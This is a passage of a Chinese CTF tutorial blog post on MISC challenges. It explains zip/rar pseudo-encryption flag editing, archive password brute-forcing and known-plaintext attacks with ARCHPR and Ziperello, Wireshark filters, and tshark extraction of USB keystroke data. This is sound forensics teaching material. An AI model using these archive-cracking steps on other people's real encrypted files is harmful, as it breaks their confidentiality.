title="伪加密"></a>伪加密</h3><p>如果压缩文件是加密的，或者文件头正常但是压缩错误，首先尝试问就按是否是伪加密。zip文件是否是加密，是通过标识符来显示的，在每个文件的文件目录字段有一位专门标识了文件是否加密，将其实设置为00表示该文件未加密，如果成功解压则文件为伪加密，如果解压出错说明文件为真加密，这时候就需要根据线索，或者使用工具来破解密码.</p><p><strong>如果是真加密也不用担心，密码一般都不会太复杂，而且一般都会给出密码位数（在爆破工具中要选择位数），它主要考察有没有暴力破解的工具和技术</strong></p><h4 id="zip-伪加密"><a href="#zip-伪加密" class="headerlink" title="zip 伪加密"></a>zip 伪加密</h4><p><img src="/posts/d708c66/25.png"></p><p>用 WinHex 或者 010editor 打开 文件 将 标识的两处 09 00 改成 00 00  保存文件</p><p><img src="/posts/d708c66/22.png"></p><p><img src="/posts/d708c66/23.png"></p><p><strong>注：如果修改错误或者是真加密，文件名后面会有 星号 （  *  ）或者打开错误</strong></p><h4 id="rar-伪加密"><a href="#rar-伪加密" class="headerlink" title="rar 伪加密"></a>rar 伪加密</h4><p>rar 文件由于有头部校验， 使用 伪加密时 打开文件会出现报错，使用winhex 修改标志位后如果报错消失且正常解压缩，说明是伪加密。使用winhex 打开rar 文件，找到第24个字节，该字节尾数为4 表示加密，0表示无加密，将尾数改为0即可破解伪加密</p><p><img src="/posts/d708c66/26.png"></p><h3 id="zip-密码破解"><a href="#zip-密码破解" class="headerlink" title="zip 密码破解"></a>zip 密码破解</h3><p>ziperello 工具</p><p><img src="/posts/d708c66/27.png"></p><h3 id="rar-密码破解"><a href="#rar-密码破解" class="headerlink" title="rar 密码破解"></a>rar 密码破解</h3><p>ARCHPR 工具</p><p><img src="/posts/d708c66/28.png"></p><p>如果知道密码的一部分可以选择使用掩码</p><h5 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h5><p>使用场景：已知加密的压缩文件中的铭文内容</p><p>例： 假设一个加密的压缩包中有两个文件 readme.txt 和 flag.txt，其中 flag.txt 的内容是我们希望知道的内容，而我们拥有readme.txt 的明文文件，使用上述两个文件可进行明文攻击</p><p>操作:</p><ol><li>将readme.txt 文件进行压缩，编程readme1.rar</li><li>打开 ARCHAR ，攻击类型选择明文，明文文件路径选择readme1.rar（j将明文文件不加密压缩后的文件），加密的文件</li><li>选择要破解的文件，点击开始，破解成功</li></ol><p><strong>注意： 使用该方法需要注意两个关键点</strong></p><ul><li>有一个明文文件，压缩后CRC值与加密压缩包中的文件一致</li><li>明文文件的压缩算法需要与加密压缩文件的压缩算法一致</li></ul><p><strong>有时候不一定能破解出文件口令，但是能够找到加密密钥等信息，可以直接将文件解密，点解确定保存解密后的文件即可</strong></p><p><img src="/posts/d708c66/30.png"></p><h2 id="流量分析-wireshark"><a href="#流量分析-wireshark" class="headerlink" title="流量分析 wireshark"></a>流量分析 wireshark</h2><p>流量分析中常用协议</p><ul><li>TCP</li><li>UDP</li><li>HTTP</li><li>TLS</li><li>HTTPS</li><li>USB</li><li>DNS</li><li>WIFI</li><li>ICMP</li><li>ARP</li></ul><p><img src="/posts/d708c66/3.png"></p><h3 id="流量包修复"><a href="#流量包修复" class="headerlink" title="流量包修复"></a>流量包修复</h3><h4 id="tshark"><a href="#tshark" class="headerlink" title="tshark"></a>tshark</h4><p>wireshark 的命令行版</p><p><img src="/posts/d708c66/4.png"></p><h3 id="协议分析"><a href="#协议分析" class="headerlink" title="协议分析"></a>协议分析</h3><h3 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h3><h4 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h4><h5 id="过滤ip"><a href="#过滤ip" class="headerlink" title="过滤ip"></a>过滤ip</h5><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">ip.src <span class="hljs-keyword">eq</span> <span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> <span class="hljs-keyword">or</span> ip.dst <span class="hljs-keyword">eq</span> <span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> 或 ip.addr <span class="hljs-keyword">eq</span> <span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span><br></code></pre></td></tr></table></figure><h5 id="过滤端口"><a href="#过滤端口" class="headerlink" title="过滤端口"></a>过滤端口</h5><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">tcp</span>.<span class="hljs-keyword">port</span> eq 80 or udp.<span class="hljs-keyword">port</span> eq 80<br><span class="hljs-title">tcp</span>.dst<span class="hljs-keyword">port</span> == 80 只显示tcp协议的目标端口为80 <br><span class="hljs-title">tcp</span>.src<span class="hljs-keyword">port</span> == 80 只显示tcp协议的源端口为80<br><span class="hljs-title">tcp</span>.<span class="hljs-keyword">port</span> &gt;= 1 and tcp.<span class="hljs-keyword">port</span> &lt;= 80<br></code></pre></td></tr></table></figure><h5 id="过滤协议"><a href="#过滤协议" class="headerlink" title="过滤协议"></a>过滤协议</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">tcp<span class="hljs-regexp">/udp/</span>arp<span class="hljs-regexp">/icmp/</span>http<span class="hljs-regexp">/ftp/</span>dns/ip<br></code></pre></td></tr></table></figure><h5 id="过滤mac"><a href="#过滤mac" class="headerlink" title="过滤mac"></a>过滤mac</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">eth</span>.dst == A0:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">04</span>:C:<span class="hljs-number">84</span>   过滤目标mac地址<br></code></pre></td></tr></table></figure><h5 id="包长度过滤"><a href="#包长度过滤" class="headerlink" title="包长度过滤"></a>包长度过滤</h5><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">udp.length <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">26</span><br></code></pre></td></tr></table></figure><h5 id="USB流量分析"><a href="#USB流量分析" class="headerlink" title="USB流量分析"></a>USB流量分析</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">tshark -<span class="hljs-attribute">r</span> usb1<span class="hljs-selector-class">.pcap</span> -T fields -e usb<span class="hljs-selector-class">.capdata</span> &gt; usbdata<span class="hljs-selector-class">.txt</span><br></code></pre></td></tr></table></figure><h4 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h4><ul><li>使用 Github 上一个大佬写的工具\<ul><li><a href="https://github.com/Mumuzi7179/UsbKeyboard_Mouse_Hacker_Gui">https://github.com/Mumuzi7179/UsbKeyboard_Mouse_Hacker_Gui</a></li><li><img src="/posts/d708c66/Mouse_Key2.png"></li></ul></li></ul><ul><li>选择要提取的数据，选择键盘或者鼠标流量，将cap文件拖入程序中即可</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
